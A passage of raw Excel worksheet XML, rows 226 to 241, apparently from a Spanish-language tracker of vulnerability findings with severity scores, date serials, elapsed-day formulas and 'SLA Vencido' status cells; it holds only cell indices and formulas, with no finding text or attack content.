      <c r="T226" s="8">
        <v>45093</v>
      </c>
      <c r="U226" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1116</v>
      </c>
      <c r="V226" s="8">
        <f t="shared" si="10"/>
        <v>45183</v>
      </c>
      <c r="W226" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X226" s="12"/>
      <c r="Y226" s="11"/>
      <c r="Z226" s="11"/>
      <c r="AA226" s="8">
        <v>45189</v>
      </c>
      <c r="AB226" s="32" t="s">
        <v>927</v>
      </c>
      <c r="AC226" s="32" t="s">
        <v>70</v>
      </c>
      <c r="AD226" s="9" t="s">
        <v>928</v>
      </c>
      <c r="AE226" s="8">
        <v>45179</v>
      </c>
      <c r="AF226" s="5" t="s">
        <v>929</v>
      </c>
      <c r="AG226" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH226" t="str">
        <f>IFERROR(VLOOKUP(H226,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="227" spans="1:34" ht="275.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A227" s="5">
        <v>226</v>
      </c>
      <c r="B227" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C227" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D227" s="5"/>
      <c r="E227" s="4"/>
      <c r="F227" s="4"/>
      <c r="G227" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H227" s="9" t="s">
        <v>930</v>
      </c>
      <c r="I227" s="4" t="s">
        <v>931</v>
      </c>
      <c r="J227" s="4" t="s">
        <v>466</v>
      </c>
      <c r="K227" s="6"/>
      <c r="L227" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M227" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N227" s="5">
        <v>5.3</v>
      </c>
      <c r="O227" s="14"/>
      <c r="P227" s="10"/>
      <c r="Q227" s="6" t="s">
        <v>759</v>
      </c>
      <c r="R227" s="4"/>
      <c r="S227" s="22"/>
      <c r="T227" s="8">
        <v>45119</v>
      </c>
      <c r="U227" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1090</v>
      </c>
      <c r="V227" s="8">
        <f t="shared" si="10"/>
        <v>45209</v>
      </c>
      <c r="W227" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X227" s="12"/>
      <c r="Y227" s="11"/>
      <c r="Z227" s="11"/>
      <c r="AA227" s="8"/>
      <c r="AB227" s="32" t="s">
        <v>932</v>
      </c>
      <c r="AC227" s="32" t="s">
        <v>933</v>
      </c>
      <c r="AD227" s="9" t="s">
        <v>934</v>
      </c>
      <c r="AE227" s="8" t="s">
        <v>763</v>
      </c>
      <c r="AF227" s="6" t="s">
        <v>935</v>
      </c>
      <c r="AG227" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH227" t="str">
        <f>IFERROR(VLOOKUP(H227,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="228" spans="1:34" ht="174" hidden="1" x14ac:dyDescent="0.35">
      <c r="A228" s="5">
        <v>227</v>
      </c>
      <c r="B228" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C228" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D228" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E228" s="4"/>
      <c r="F228" s="4"/>
      <c r="G228" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H228" s="9" t="s">
        <v>936</v>
      </c>
      <c r="I228" s="4" t="s">
        <v>937</v>
      </c>
      <c r="J228" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K228" s="6"/>
      <c r="L228" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M228" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N228" s="5">
        <v>3.1</v>
      </c>
      <c r="O228" s="14"/>
      <c r="P228" s="10"/>
      <c r="Q228" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R228" s="4"/>
      <c r="S228" s="22"/>
      <c r="T228" s="8">
        <v>45119</v>
      </c>
      <c r="U228" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1090</v>
      </c>
      <c r="V228" s="8">
        <f t="shared" si="10"/>
        <v>45239</v>
      </c>
      <c r="W228" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X228" s="12"/>
      <c r="Y228" s="11"/>
      <c r="Z228" s="11"/>
      <c r="AA228" s="8"/>
      <c r="AB228" s="32" t="s">
        <v>938</v>
      </c>
      <c r="AC228" s="32" t="s">
        <v>873</v>
      </c>
      <c r="AD228" s="9" t="s">
        <v>905</v>
      </c>
      <c r="AE228" s="40" t="s">
        <v>792</v>
      </c>
      <c r="AF228" s="21" t="s">
        <v>939</v>
      </c>
      <c r="AG228" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH228" t="str">
        <f>IFERROR(VLOOKUP(H228,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="229" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A229" s="5">
        <v>228</v>
      </c>
      <c r="B229" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C229" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D229" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E229" s="4"/>
      <c r="F229" s="4"/>
      <c r="G229" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H229" s="9" t="s">
        <v>940</v>
      </c>
      <c r="I229" s="4" t="s">
        <v>941</v>
      </c>
      <c r="J229" s="4" t="s">
        <v>910</v>
      </c>
      <c r="K229" s="6"/>
      <c r="L229" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M229" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N229" s="5">
        <v>3.4</v>
      </c>
      <c r="O229" s="14"/>
      <c r="P229" s="10"/>
      <c r="Q229" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R229" s="4"/>
      <c r="S229" s="22"/>
      <c r="T229" s="8">
        <v>45119</v>
      </c>
      <c r="U229" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1090</v>
      </c>
      <c r="V229" s="8">
        <f t="shared" si="10"/>
        <v>45239</v>
      </c>
      <c r="W229" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X229" s="12"/>
      <c r="Y229" s="11"/>
      <c r="Z229" s="11"/>
      <c r="AA229" s="8"/>
      <c r="AB229" s="32" t="s">
        <v>942</v>
      </c>
      <c r="AC229" s="32" t="s">
        <v>912</v>
      </c>
      <c r="AD229" s="9" t="s">
        <v>905</v>
      </c>
      <c r="AE229" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF229" s="21" t="s">
        <v>939</v>
      </c>
      <c r="AG229" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH229" t="str">
        <f>IFERROR(VLOOKUP(H229,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="230" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A230" s="5">
        <v>229</v>
      </c>
      <c r="B230" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C230" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D230" s="5"/>
      <c r="E230" s="4"/>
      <c r="F230" s="4"/>
      <c r="G230" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H230" s="4" t="s">
        <v>943</v>
      </c>
      <c r="I230" s="4"/>
      <c r="J230" s="4" t="s">
        <v>944</v>
      </c>
      <c r="K230" s="6"/>
      <c r="L230" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M230" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N230" s="5">
        <v>5.3</v>
      </c>
      <c r="O230" s="14"/>
      <c r="P230" s="10"/>
      <c r="Q230" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R230" s="4"/>
      <c r="S230" s="22"/>
      <c r="T230" s="8">
        <v>45052</v>
      </c>
      <c r="U230" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1157</v>
      </c>
      <c r="V230" s="8">
        <f t="shared" si="10"/>
        <v>45142</v>
      </c>
      <c r="W230" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X230" s="12"/>
      <c r="Y230" s="11"/>
      <c r="Z230" s="11"/>
      <c r="AA230" s="8">
        <v>45186</v>
      </c>
      <c r="AB230" s="32" t="s">
        <v>945</v>
      </c>
      <c r="AC230" s="32" t="s">
        <v>946</v>
      </c>
      <c r="AD230" s="9"/>
      <c r="AE230" s="8"/>
      <c r="AF230" s="5" t="s">
        <v>497</v>
      </c>
      <c r="AG230" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH230" t="str">
        <f>IFERROR(VLOOKUP(H230,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="231" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A231" s="5">
        <v>230</v>
      </c>
      <c r="B231" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C231" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D231" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E231" s="4"/>
      <c r="F231" s="4"/>
      <c r="G231" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H231" s="4" t="s">
        <v>947</v>
      </c>
      <c r="I231" s="4"/>
      <c r="J231" s="4" t="s">
        <v>948</v>
      </c>
      <c r="K231" s="6"/>
      <c r="L231" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M231" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N231" s="5">
        <v>6.1</v>
      </c>
      <c r="O231" s="14"/>
      <c r="P231" s="10"/>
      <c r="Q231" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R231" s="4"/>
      <c r="S231" s="22"/>
      <c r="T231" s="8">
        <v>45031</v>
      </c>
      <c r="U231" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V231" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W231" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X231" s="12"/>
      <c r="Y231" s="11"/>
      <c r="Z231" s="11"/>
      <c r="AA231" s="8">
        <v>45471</v>
      </c>
      <c r="AB231" s="32" t="s">
        <v>949</v>
      </c>
      <c r="AC231" s="32" t="s">
        <v>950</v>
      </c>
      <c r="AD231" s="9"/>
      <c r="AE231" s="8">
        <v>45199</v>
      </c>
      <c r="AF231" s="27" t="s">
        <v>951</v>
      </c>
      <c r="AG231" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH231" t="str">
        <f>IFERROR(VLOOKUP(H231,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="232" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A232" s="5">
        <v>231</v>
      </c>
      <c r="B232" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C232" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D232" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E232" s="4"/>
      <c r="F232" s="4"/>
      <c r="G232" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H232" s="4" t="s">
        <v>952</v>
      </c>
      <c r="I232" s="4"/>
      <c r="J232" s="4" t="s">
        <v>455</v>
      </c>
      <c r="K232" s="6"/>
      <c r="L232" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M232" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N232" s="5">
        <v>6.5</v>
      </c>
      <c r="O232" s="14"/>
      <c r="P232" s="10"/>
      <c r="Q232" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R232" s="4"/>
      <c r="S232" s="22"/>
      <c r="T232" s="8">
        <v>45031</v>
      </c>
      <c r="U232" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V232" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W232" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X232" s="12"/>
      <c r="Y232" s="11"/>
      <c r="Z232" s="11"/>
      <c r="AA232" s="8">
        <v>45471</v>
      </c>
      <c r="AB232" s="32" t="s">
        <v>953</v>
      </c>
      <c r="AC232" s="32" t="s">
        <v>954</v>
      </c>
      <c r="AD232" s="9"/>
      <c r="AE232" s="8">
        <v>45199</v>
      </c>
      <c r="AF232" s="27" t="s">
        <v>733</v>
      </c>
      <c r="AG232" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH232" t="str">
        <f>IFERROR(VLOOKUP(H232,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="233" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A233" s="5">
        <v>232</v>
      </c>
      <c r="B233" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C233" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D233" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E233" s="4"/>
      <c r="F233" s="4"/>
      <c r="G233" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H233" s="4" t="s">
        <v>955</v>
      </c>
      <c r="I233" s="4"/>
      <c r="J233" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K233" s="6"/>
      <c r="L233" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M233" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N233" s="5">
        <v>5.3</v>
      </c>
      <c r="O233" s="14"/>
      <c r="P233" s="10"/>
      <c r="Q233" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R233" s="4"/>
      <c r="S233" s="22"/>
      <c r="T233" s="8">
        <v>45031</v>
      </c>
      <c r="U233" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V233" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W233" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X233" s="12"/>
      <c r="Y233" s="11"/>
      <c r="Z233" s="11"/>
      <c r="AA233" s="8">
        <v>45124</v>
      </c>
      <c r="AB233" s="32" t="s">
        <v>956</v>
      </c>
      <c r="AC233" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD233" s="9"/>
      <c r="AE233" s="8"/>
      <c r="AF233" s="5" t="s">
        <v>497</v>
      </c>
      <c r="AG233" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH233" t="str">
        <f>IFERROR(VLOOKUP(H233,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="234" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A234" s="5">
        <v>233</v>
      </c>
      <c r="B234" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C234" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D234" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E234" s="4"/>
      <c r="F234" s="4"/>
      <c r="G234" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H234" s="4" t="s">
        <v>958</v>
      </c>
      <c r="I234" s="4"/>
      <c r="J234" s="4" t="s">
        <v>556</v>
      </c>
      <c r="K234" s="6"/>
      <c r="L234" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M234" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N234" s="5">
        <v>4.3</v>
      </c>
      <c r="O234" s="14"/>
      <c r="P234" s="10"/>
      <c r="Q234" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R234" s="4"/>
      <c r="S234" s="22"/>
      <c r="T234" s="8">
        <v>45031</v>
      </c>
      <c r="U234" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V234" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W234" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X234" s="12"/>
      <c r="Y234" s="11"/>
      <c r="Z234" s="11"/>
      <c r="AA234" s="8"/>
      <c r="AB234" s="32" t="s">
        <v>959</v>
      </c>
      <c r="AC234" s="32" t="s">
        <v>960</v>
      </c>
      <c r="AD234" s="9"/>
      <c r="AE234" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF234" s="21" t="s">
        <v>939</v>
      </c>
      <c r="AG234" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH234" t="str">
        <f>IFERROR(VLOOKUP(H234,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="235" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A235" s="5">
        <v>234</v>
      </c>
      <c r="B235" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C235" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D235" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E235" s="4"/>
      <c r="F235" s="4"/>
      <c r="G235" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H235" s="4" t="s">
        <v>961</v>
      </c>
      <c r="I235" s="4"/>
      <c r="J235" s="4" t="s">
        <v>560</v>
      </c>
      <c r="K235" s="6"/>
      <c r="L235" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M235" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N235" s="5">
        <v>4.3</v>
      </c>
      <c r="O235" s="14"/>
      <c r="P235" s="10"/>
      <c r="Q235" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R235" s="4"/>
      <c r="S235" s="22"/>
      <c r="T235" s="8">
        <v>45031</v>
      </c>
      <c r="U235" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V235" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W235" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X235" s="12"/>
      <c r="Y235" s="11"/>
      <c r="Z235" s="11"/>
      <c r="AA235" s="8"/>
      <c r="AB235" s="32" t="s">
        <v>962</v>
      </c>
      <c r="AC235" s="32" t="s">
        <v>963</v>
      </c>
      <c r="AD235" s="9"/>
      <c r="AE235" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF235" s="21" t="s">
        <v>939</v>
      </c>
      <c r="AG235" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH235" t="str">
        <f>IFERROR(VLOOKUP(H235,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="236" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A236" s="5">
        <v>235</v>
      </c>
      <c r="B236" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C236" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D236" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E236" s="4"/>
      <c r="F236" s="4"/>
      <c r="G236" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H236" s="6" t="s">
        <v>964</v>
      </c>
      <c r="I236" s="6"/>
      <c r="J236" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K236" s="6"/>
      <c r="L236" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M236" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N236" s="5">
        <v>5.3</v>
      </c>
      <c r="O236" s="14"/>
      <c r="P236" s="10"/>
      <c r="Q236" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R236" s="4"/>
      <c r="S236" s="22"/>
      <c r="T236" s="8">
        <v>45107</v>
      </c>
      <c r="U236" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1102</v>
      </c>
      <c r="V236" s="8">
        <f t="shared" si="10"/>
        <v>45197</v>
      </c>
      <c r="W236" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X236" s="12"/>
      <c r="Y236" s="11"/>
      <c r="Z236" s="11"/>
      <c r="AA236" s="8">
        <v>45555</v>
      </c>
      <c r="AB236" s="32" t="s">
        <v>965</v>
      </c>
      <c r="AC236" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD236" s="9"/>
      <c r="AE236" s="27" t="s">
        <v>894</v>
      </c>
      <c r="AF236" s="27" t="s">
        <v>966</v>
      </c>
      <c r="AG236" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH236" t="str">
        <f>IFERROR(VLOOKUP(H236,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="237" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A237" s="5">
        <v>236</v>
      </c>
      <c r="B237" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C237" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D237" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E237" s="4"/>
      <c r="F237" s="4"/>
      <c r="G237" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H237" s="4" t="s">
        <v>967</v>
      </c>
      <c r="I237" s="4"/>
      <c r="J237" s="4" t="s">
        <v>556</v>
      </c>
      <c r="K237" s="6"/>
      <c r="L237" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M237" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N237" s="5">
        <v>4.3</v>
      </c>
      <c r="O237" s="14"/>
      <c r="P237" s="10"/>
      <c r="Q237" s="6" t="s">
        <v>759</v>
      </c>
      <c r="R237" s="4"/>
      <c r="S237" s="22"/>
      <c r="T237" s="8">
        <v>45031</v>
      </c>
      <c r="U237" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V237" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W237" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X237" s="12"/>
      <c r="Y237" s="11"/>
      <c r="Z237" s="11"/>
      <c r="AA237" s="8"/>
      <c r="AB237" s="32" t="s">
        <v>968</v>
      </c>
      <c r="AC237" s="32" t="s">
        <v>960</v>
      </c>
      <c r="AD237" s="9"/>
      <c r="AE237" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF237" s="5"/>
      <c r="AG237" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH237" t="str">
        <f>IFERROR(VLOOKUP(H237,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="238" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A238" s="5">
        <v>237</v>
      </c>
      <c r="B238" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C238" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D238" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E238" s="4"/>
      <c r="F238" s="4"/>
      <c r="G238" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H238" s="4" t="s">
        <v>970</v>
      </c>
      <c r="I238" s="4"/>
      <c r="J238" s="4" t="s">
        <v>971</v>
      </c>
      <c r="K238" s="6"/>
      <c r="L238" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M238" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N238" s="5">
        <v>5.3</v>
      </c>
      <c r="O238" s="14"/>
      <c r="P238" s="10">
        <v>190242107210</v>
      </c>
      <c r="Q238" s="6" t="s">
        <v>871</v>
      </c>
      <c r="R238" s="4"/>
      <c r="S238" s="22"/>
      <c r="T238" s="8">
        <v>45059</v>
      </c>
      <c r="U238" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1150</v>
      </c>
      <c r="V238" s="8">
        <f t="shared" si="10"/>
        <v>45149</v>
      </c>
      <c r="W238" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X238" s="12"/>
      <c r="Y238" s="11"/>
      <c r="Z238" s="11"/>
      <c r="AA238" s="8"/>
      <c r="AB238" s="32" t="s">
        <v>972</v>
      </c>
      <c r="AC238" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD238" s="9"/>
      <c r="AE238" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF238" s="5" t="s">
        <v>973</v>
      </c>
      <c r="AG238" s="27" t="s">
        <v>974</v>
      </c>
      <c r="AH238" t="str">
        <f>IFERROR(VLOOKUP(H238,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="239" spans="1:34" ht="261" hidden="1" x14ac:dyDescent="0.35">
      <c r="A239" s="5">
        <v>238</v>
      </c>
      <c r="B239" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C239" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D239" s="5"/>
      <c r="E239" s="4"/>
      <c r="F239" s="4"/>
      <c r="G239" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H239" s="6" t="s">
        <v>975</v>
      </c>
      <c r="I239" s="6"/>
      <c r="J239" s="4" t="s">
        <v>976</v>
      </c>
      <c r="K239" s="6"/>
      <c r="L239" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M239" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N239" s="5"/>
      <c r="O239" s="14"/>
      <c r="P239" s="10" t="s">
        <v>253</v>
      </c>
      <c r="Q239" s="6" t="s">
        <v>977</v>
      </c>
      <c r="R239" s="4"/>
      <c r="S239" s="22">
        <v>500</v>
      </c>
      <c r="T239" s="8">
        <v>45031</v>
      </c>
      <c r="U239" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1178</v>
      </c>
      <c r="V239" s="8">
        <f t="shared" si="10"/>
        <v>45121</v>
      </c>
      <c r="W239" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X239" s="12"/>
      <c r="Y239" s="11"/>
      <c r="Z239" s="11"/>
      <c r="AA239" s="8">
        <v>45555</v>
      </c>
      <c r="AB239" s="32" t="s">
        <v>978</v>
      </c>
      <c r="AC239" s="32" t="s">
        <v>979</v>
      </c>
      <c r="AD239" s="9" t="s">
        <v>980</v>
      </c>
      <c r="AE239" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF239" s="21" t="s">
        <v>981</v>
      </c>
      <c r="AG239" s="27" t="s">
        <v>875</v>
      </c>
      <c r="AH239" t="str">
        <f>IFERROR(VLOOKUP(H239,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="240" spans="1:34" ht="246.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A240" s="5">
        <v>239</v>
      </c>
      <c r="B240" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C240" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D240" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E240" s="4"/>
      <c r="F240" s="4"/>
      <c r="G240" s="6" t="s">
        <v>739</v>
      </c>
      <c r="H240" s="4" t="s">
        <v>982</v>
      </c>
      <c r="I240" s="4"/>
      <c r="J240" s="4" t="s">
        <v>983</v>
      </c>
      <c r="K240" s="6"/>
      <c r="L240" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M240" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N240" s="5"/>
      <c r="O240" s="14"/>
      <c r="P240" s="10"/>
      <c r="Q240" s="6" t="s">
        <v>743</v>
      </c>
      <c r="R240" s="4"/>
      <c r="S240" s="22"/>
      <c r="T240" s="8">
        <v>45142</v>
      </c>
      <c r="U240" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1067</v>
      </c>
      <c r="V240" s="8">
        <f t="shared" si="10"/>
        <v>45172</v>
      </c>
      <c r="W240" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X240" s="12"/>
      <c r="Y240" s="11"/>
      <c r="Z240" s="11"/>
      <c r="AA240" s="8">
        <v>45177</v>
      </c>
      <c r="AB240" s="32" t="s">
        <v>984</v>
      </c>
      <c r="AC240" s="32" t="s">
        <v>985</v>
      </c>
      <c r="AD240" s="9"/>
      <c r="AE240" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF240" s="5"/>
      <c r="AG240" s="27" t="s">
        <v>747</v>
      </c>
      <c r="AH240" t="str">
        <f>IFERROR(VLOOKUP(H240,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="241" spans="1:34" ht="246.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A241" s="5">
        <v>240</v>
      </c>
      <c r="B241" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C241" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D241" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E241" s="4"/>
      <c r="F241" s="4"/>
      <c r="G241" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H241" s="4" t="s">
        <v>986</v>
      </c>
      <c r="I241" s="4"/>
      <c r="J241" s="4" t="s">
        <v>983</v>
      </c>
      <c r="K241" s="6"/>
      <c r="L241" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M241" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N241" s="5"/>
      <c r="O241" s="14"/>
      <c r="P241" s="10"/>
      <c r="Q241" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R241" s="4"/>
      <c r="S241" s="22"/>
      <c r="T241" s="8">
        <v>45142</v>
      </c>
